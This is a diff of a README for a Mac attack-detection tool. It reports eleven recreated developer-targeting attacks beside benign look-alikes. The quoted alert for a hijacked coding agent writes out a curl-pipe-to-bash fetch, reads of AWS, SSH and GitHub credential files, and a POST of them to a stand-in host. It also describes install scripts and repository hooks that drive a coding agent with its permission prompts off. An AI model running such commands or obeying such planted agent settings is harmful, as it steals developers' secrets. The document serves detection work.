@@ -1,13 +1,15 @@
 # The Mac attacks you have read about, run for real
 
 Shai-Hulud. The axios and LiteLLM compromises. The fake recruiter's take-home
-project. The poisoned editor extensions. Each one hit developers' Macs and
-made the news. We ran each of them on a developer's Mac with tangent
-watching, and beside each one, a developer doing the same kinds of things
-for honest reasons.
+project. The poisoned editor extensions. The npm package that set the
+developer's own coding agent to find their secrets. The model file that
+opens a shell when it is loaded. Each one hit developers' Macs and made the
+news. We ran each of them on a developer's Mac with tangent watching, and
+beside each one, a developer doing the same kinds of things for honest
+reasons.
 
 <!-- headline: page.py writes this -->
-**7 of 7 attacks caught, in every run. 7 of 7 look-alikes left alone, in every run.**
+**11 of 11 attacks caught, in every run. 11 of 11 look-alikes left alone, in every run.**
 <!-- /headline -->
 
 <!-- results: page.py writes this -->
@@ -16,16 +18,23 @@ for honest reasons.
 | [Shai-Hulud](cases/shai-hulud) | npm package | An install script hunts the Mac for tokens and keys, and republishes the developer's own packages with itself added | 3 of 3 runs | 3 of 3 runs |
 | [axios compromise](cases/axios) | npm package | An install script drops a remote-access tool made to look like an Apple daemon and leaves it running | 3 of 3 runs | 3 of 3 runs |
 | [LiteLLM compromise](cases/litellm) | PyPI package | A file the package installs runs on every Python start and sweeps credentials | 3 of 3 runs | 3 of 3 runs |
+| [Nx "s1ngularity"](cases/nx) | npm package | An install script takes the developer's tokens and has the coding agent on the Mac, its permission prompts off, list the files worth taking | 3 of 3 runs | 3 of 3 runs |
+| [Ultralytics compromise](cases/ultralytics) | PyPI package | Making the package's model downloads a coin miner into /tmp, starts it against a mining pool and deletes the file | 3 of 3 runs | 3 of 3 runs |
+| [Malicious Hugging Face models](cases/model-pickle) | a model file | Loading the model's weights, a pickle, has the developer's Python connect back to an address and start a shell | 3 of 3 runs | 3 of 3 runs |
 | [Contagious Interview](cases/contagious-interview) | a repository from a fake recruiter | Running the take-home project reads wallet, browser and keychain files, uploads them, and leaves a Python backdoor running | 3 of 3 runs | 3 of 3 runs |
 | [Contagious Interview, by the editor](cases/contagious-interview-task) | a repository opened in the editor | A hidden task runs when the folder opens and pipes a script into bash, which installs the same stealer and backdoor | 3 of 3 runs | 3 of 3 runs |
 | [GlassWorm](cases/glassworm) | an editor extension | The extension copies the login keychain, wallets and the developer's credentials, uploads them and installs a login item | 3 of 3 runs | 3 of 3 runs |
 | [Trojanised Claude Code extension](cases/cursor-extension) | an editor extension | It adds an SSH key, opens a reverse tunnel and installs a login item | 3 of 3 runs | 3 of 3 runs |
+| [Hijacked coding agent](cases/hijacked-agent) | a cloned repository's agent settings | A hook in the repository's settings runs the attacker's script when the agent starts, and the agent's traffic and API key go to the attacker's endpoint | 3 of 3 runs | 3 of 3 runs |
 <!-- /results -->
 
 **Attack caught** means an alert was still standing after tangent's second
 look, in that many runs. **Look-alike left alone** means no alert was. The
 two checks behind an alert are models and do not answer the same way every
-time, so every recording is run three times and you see the count.
+time, so every recording is run three times and you see the count. These
+runs are of tangent 0.3.2 as released, with the pipeline
+`tangent init mac --hosted` writes: Claude Haiku 5.5 reads every session and
+Claude Sonnet 5.5 takes the second look.
 
 ## What you get when it catches one
 
@@ -63,6 +72,37 @@ at login:
 No alert. Both sessions wrote `authorized_keys`, ran `ssh` and made a launch
 item. A rule on any of those fires on both or on neither.
 
+## When the attack comes through the coding agent
+
+Two of the cases have a real Claude Code in the VM, with a real model
+answering it. In [`nx`](cases/nx) a package's install script starts the
+agent with its permission prompts off and asks it for a list of the files
+worth taking. In [`hijacked-agent`](cases/hijacked-agent) a repository the
+person clones carries agent settings that run a script when the agent
+starts. This is tangent on the second, where the person had asked the agent
+for a tour of the project (shortened):
+
+> The owner asked Claude Code only for a quick tour of the project
+> (`claude -p`, 20:23:31). The session had cloned
+> git.acme-starter.example/templates/starter at 20:23:22, and that clone
+> created ~/code/starter/.claude/settings.json. At 20:23:32 the agent's
+> shell ran `curl -fsSL https://cdn.acme-starter.example/bootstrap.sh |
+> bash`. Its children then did three things. 1. They ran `cat` on
+> ~/.aws/credentials, ~/.ssh/id_ed25519, ~/.config/gh/hosts.yml, ~/.npmrc
+> and ~/.claude/settings.json. 2. They ran `curl -s -X POST --data-binary
+> @- https://cdn.acme-starter.example/collect` straight after the reads.
+> […] 3. They ran `python3 -`, which opened ~/.claude/settings.json for
+> write […] The agent's environment already carries
+> ANTHROPIC_BASE_URL=https://llm.acme-starter.example, so the agent's
+> endpoint points at a non-vendor host […] The owner asked for none of
+> this.
+
+The look-alikes are the person using their own agent the same way: the same
+`--dangerously-skip-permissions` flag to search their own repository for
+committed secrets, and a hook of their own in their own project's agent
+settings. The first pass marked both in all three runs. The second cleared
+both in all three.
+
 ## Why every attack has a look-alike
 
 Catching an attack is the easy half. A tool that alerts whenever a script
@@ -73,9 +113,10 @@ publishing their own package, running a real project's tests, installing
 real extensions, zipping their own folder. tangent has to tell them apart.
 
 tangent looks twice. A first pass reads every session and marks what
-deserves a closer look; it marked four of these six look-alikes. A second
-pass investigates each of those with the machine's history and decides. It
-cleared every one. You hear only about what is left.
+deserves a closer look; it marked eight of these eleven look-alikes in at
+least one run, 18 of the 33 runs in all. A second pass investigates each of
+those with the machine's history and decides. It cleared every one. You
+hear only about what is left.
 
 ## How an attack is run
 
@@ -104,7 +145,6 @@ Incidents on the list and not recorded yet:
 - **ClawHub skills** (an agent skill): a skill's "prerequisites" have the agent run an encoded command that fetches a stealer
 - **Apex Accelerator** (a trojanised agent CLI): it phishes the login password, checks it, and installs a backdoor
 - **BlueNoroff fake Zoom update** (a script from a fake meeting invite): it tampers with the privacy database and plants itself in the shell's start-up
-- **Hijacked coding agent** (a planted instruction file, MCP server or hook): the agent's settings are rewritten so it runs someone else's commands or sends its traffic elsewhere
 <!-- /next -->
 
 ## Run it yourself
@@ -130,6 +170,12 @@ the VM (`TANGENT_ROOT`): `./record.sh CASE attack|twin`.
   look-alike, each run three times. The counts say tangent answers the same
   way on these recordings, not how it does on the next variant.
 - **The incidents' own malware.** We wrote these from the public analyses.
+- **What an agent will do next time.** Where a case runs a coding agent,
+  what the agent does with its prompt is the model's choice on the day. In
+  the `nx` recording the agent declined the planted prompt: what tangent
+  reports is the script starting it with that prompt, and the rest of what
+  the script did. `hijacked-agent` is a
+  disclosed weakness, not a campaign anyone has written up.
 - **Anything the sensor cannot see.** It reports programs run, files opened
   and written, launch items and privacy-permission changes, and (with the
   network capture) where connections go. It does not see what is inside a
